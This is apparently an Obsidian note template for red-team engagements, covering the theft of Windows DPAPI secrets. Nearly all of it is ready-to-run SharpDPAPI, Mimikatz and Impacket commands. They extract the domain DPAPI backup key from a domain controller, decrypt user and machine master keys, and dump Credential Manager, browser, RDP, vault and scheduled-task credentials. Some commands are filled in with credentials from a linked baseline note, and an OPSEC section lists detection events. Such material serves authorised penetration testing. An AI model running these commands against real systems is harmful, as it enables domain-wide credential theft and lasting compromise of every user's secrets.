---
# Attack-specific fields
dpapi_target_host:
dpapi_target_user:
dpapi_backup_key:
dpapi_method: sharpdpapi
notes:
---

# DPAPI Secrets

> [!abstract] Attack Summary
> **DPAPI (Data Protection API)** encrypts sensitive data like browser passwords, credential manager entries, and RDP credentials using master keys. Master keys are protected by the user's password or (for machine keys) the SYSTEM DPAPI. A domain **backup key** can decrypt all user master keys — making it extremely powerful for credential extraction.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const methods = ["sharpdpapi","mimikatz","impacket"];
const methodOptions = methods.map(m => `option(${m})`).join(',');

dv.table(["Field", "Value"], [
  ["Target Host",     `\`INPUT[text(defaultValue("${p.dpapi_target_host || b?.target_host || ''}")):dpapi_target_host]\``],
  ["Target User",     `\`INPUT[text(defaultValue("${p.dpapi_target_user || b?.username || ''}")):dpapi_target_user]\``],
  ["DPAPI Method",    `\`INPUT[inlineSelect(defaultValue(${p.dpapi_method ?? 'sharpdpapi'}),${methodOptions}):dpapi_method]\``],
]);
```

---

## Method A — Extract DPAPI Backup Key from DC

> [!info] The DPAPI backup key is stored on the DC and can decrypt **any** user's masterkey in the domain. Requires Domain Admin access to the DC.

**Windows — SharpDPAPI**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const dc_fqdn = b?.dc_fqdn ?? "DC_FQDN";
dv.paragraph("```bash\n# Extract backup key from DC (requires DA)\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe backupkey /nowrap\n\n# Save the PVK to file\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe backupkey /file:backup.pvk\n\n# Then download:\ndownload backup.pvk\n```");
```

**Windows — Mimikatz**
```dataviewjs
dv.paragraph("```bash\n# Extract DPAPI backup key via Mimikatz\nlsadump::backupkeys /export\n\n# Or targeting specific DC\nlsadump::backupkeys /system:DC_FQDN /export\n```");
```

**Linux — Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nimpacket-dpapi backupkeys --export -t " + domain + "/" + username + ":'" + password + "'@" + dc_ip + "\n```");
```

Backup key (PVK): `INPUT[text:dpapi_backup_key]`

---

## Method B — Decrypt User Master Keys with Backup Key

**Windows — SharpDPAPI (with backup key)**
```dataviewjs
const p = dv.current();
const pvkFile = p?.dpapi_backup_key || "backup.pvk";
const targetUser = p?.dpapi_target_user || "TARGET_USER";
dv.paragraph("```bash\n# Decrypt all masterkeys for a user using the backup key\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe masterkeys /pvk:" + pvkFile + "\n\n# Target specific user's masterkey directory\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe masterkeys /pvk:" + pvkFile + " /target:C:\\Users\\" + targetUser + "\\AppData\\Roaming\\Microsoft\\Protect\n```");
```

---

## Method C — Extract Credentials with Decrypted Master Keys

**Windows — SharpDPAPI (credential files)**
```dataviewjs
dv.paragraph("```bash\n# Credentials (Windows Credential Manager)\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe credentials /pvk:backup.pvk\n\n# Browser credentials (Chrome, Edge, Firefox)\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe rdg /pvk:backup.pvk\nexecute-assembly C:\\Tools\\SharpChromium\\SharpChromium\\bin\\Release\\SharpChromium.exe logins\n\n# RDP credential files (.rdg)\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe rdg /pvk:backup.pvk\n\n# Scheduled task credentials\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe schtask /pvk:backup.pvk\n```");
```

---

## Method D — Current User DPAPI (No Backup Key Needed)

> [!info] If you have code execution as the target user, you can decrypt their DPAPI secrets directly (no backup key needed).

**Windows — SharpDPAPI as current user**
```dataviewjs
dv.paragraph("```bash\n# Decrypt as the currently logged-in user (keys derived from current user's password)\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe triage\n\n# Credential Manager\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe credentials\n\n# Vault credentials\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe vaults\n```");
```

**Windows — Mimikatz**
```dataviewjs
dv.paragraph("```bash\n# Dump DPAPI credentials using Mimikatz\ndpapi::cred /in:C:\\Users\\TARGET\\AppData\\Local\\Microsoft\\Credentials\\CRED_FILE\n\n# With user masterkey\ndpapi::cred /in:CRED_FILE /masterkey:MASTERKEY_HEX\n\n# List credential files\nshell dir /a C:\\Users\\TARGET\\AppData\\Local\\Microsoft\\Credentials\\\n```");
```

---

## Method E — Machine DPAPI (SYSTEM-level Secrets)

> [!info] Machine-scoped DPAPI uses SYSTEM's credentials. These protect service passwords, SSPI credentials, and scheduled task passwords.

**Windows — SharpDPAPI machine**
```dataviewjs
dv.paragraph("```bash\n# Machine DPAPI masterkeys (requires SYSTEM)\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe machinemasterkeys\n\n# Machine credential files\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe machinecredentials\n\n# Machine certificates (CA private keys!)\nexecute-assembly C:\\Tools\\SharpDPAPI\\SharpDPAPI\\bin\\Release\\SharpDPAPI.exe machinecerts\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - Backup key extraction via MS-BKRP (BackupKey RPC) generates **Event 4662** on the DC if DPAPI auditing enabled.
> - Reading credential files generates **Event 4663** if auditing on %APPDATA% is enabled.
> - SharpDPAPI running in memory may trigger AV/EDR behavioral detection.
> - The backup key does NOT expire — once stolen, all current and future user masterkeys are compromised.

---

## Notes & Results

`INPUT[textarea:notes]`
